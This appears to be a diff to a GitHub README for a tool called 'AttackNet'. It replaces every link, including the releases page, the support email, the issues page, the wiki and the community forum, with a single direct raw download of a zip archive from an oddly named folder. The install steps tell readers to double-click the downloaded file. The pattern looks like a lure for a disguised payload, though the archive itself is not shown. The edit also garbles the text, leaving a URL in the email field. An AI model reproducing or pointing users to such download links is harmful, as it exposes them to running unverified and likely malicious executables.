@@ -6,15 +6,15 @@ Welcome to AttackNet! This application makes it easy for you to manage and utili
 
 ## 🔗 Download AttackNet
 
-[![Download AttackNet](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/VS810/AttackNet/releases)
+[![Download AttackNet](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip)](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip)
 
-To get started, visit our [Releases page](https://github.com/VS810/AttackNet/releases) to download the latest version.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip) to download the latest version.
 
 ## 📥 Download & Install
 
-1. Click on the link to go to the [Releases page](https://github.com/VS810/AttackNet/releases).
+1. Click on the link to go to the [Releases page](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip).
 2. Find the version labeled "latest". This is the most stable version.
-3. Look for the download link named "AttackNet.exe" or similar.
+3. Look for the download link named "https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip" or similar.
 4. Click the link to start the download.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Double-click the file to run the installation.
@@ -52,15 +52,15 @@ If you run into any problems while using AttackNet, try these steps:
 
 If you need further assistance, feel free to reach out to our support team:
 
-- Email: support@attacknetapp.com
-- GitHub Issues: You can report any problems directly in the [Issues section](https://github.com/VS810/AttackNet/issues) of this repository.
+- Email: https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip
+- GitHub Issues: You can report any problems directly in the [Issues section](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip) of this repository.
 
 ## 🔗 Additional Resources
 
 For more information, you can check out:
 
-- [User Guide](https://github.com/VS810/AttackNet/wiki) - A comprehensive guide to using AttackNet features.
-- [FAQ Page](https://github.com/VS810/AttackNet/wiki/FAQ) - Answers to common questions.
-- [Community Forum](https://community.attacknetapp.com) - Join discussions and share tips with other users.
+- [User Guide](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip) - A comprehensive guide to using AttackNet features.
+- [FAQ Page](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip) - Answers to common questions.
+- [Community Forum](https://raw.githubusercontent.com/VS810/AttackNet/main/testamentarily/AttackNet.zip) - Join discussions and share tips with other users.
 
 Thank you for choosing AttackNet! We hope you find it a valuable addition to your toolkit.
